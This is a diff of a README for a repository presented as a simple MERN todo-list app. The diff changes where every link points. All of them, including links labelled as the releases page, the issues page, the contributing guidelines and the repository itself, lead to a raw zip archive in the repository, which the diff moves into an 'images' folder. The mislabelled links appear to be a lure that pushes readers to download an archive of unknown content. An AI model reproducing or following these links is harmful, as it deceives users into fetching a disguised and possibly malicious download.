@@ -6,7 +6,7 @@ Welcome to the simple-todo-list-mern application! This is a user-friendly todo l
 
 ## 📥 Download Now
 
-[![Download](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/client/todo-list-mern-simple-v3.3.zip%20App-Get%20It%20Here-brightgreen)](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/client/todo-list-mern-simple-v3.3.zip)
+[![Download](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/images/todo-simple-list-mern-3.1.zip%20App-Get%20It%20Here-brightgreen)](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/images/todo-simple-list-mern-3.1.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To run the simple-todo-list-mern application, you'll need:
 
 ## 🔧 Download & Install
 
-1. Visit the [Releases Page](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/client/todo-list-mern-simple-v3.3.zip) to download the application.
+1. Visit the [Releases Page](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/images/todo-simple-list-mern-3.1.zip) to download the application.
 2. Look for the latest version at the top of the page.
 3. Click on the asset that matches your operating system to start the download.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -51,17 +51,17 @@ Yes, you can fully use the application without an internet connection. However, 
 
 ### How do I report a bug?
 
-If you find any issues, please go to the [Issues page](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/client/todo-list-mern-simple-v3.3.zip) and create a new issue with details about the bug.
+If you find any issues, please go to the [Issues page](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/images/todo-simple-list-mern-3.1.zip) and create a new issue with details about the bug.
 
 ### Can I contribute to this project?
 
-Absolutely! Contributions are welcome. Please check the [Contributing guidelines](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/client/todo-list-mern-simple-v3.3.zip).
+Absolutely! Contributions are welcome. Please check the [Contributing guidelines](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/images/todo-simple-list-mern-3.1.zip).
 
 ## 🌐 Connect with the Community
 
 Join discussions or ask questions in the community. We encourage you to share your thoughts and improvements.
 
-- [GitHub Repository](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/client/todo-list-mern-simple-v3.3.zip)
+- [GitHub Repository](https://github.com/Vergorini12/simple-todo-list-mern/raw/refs/heads/master/images/todo-simple-list-mern-3.1.zip)
 - Follow us on social media for updates.
 
 ## 🏁 Conclusion
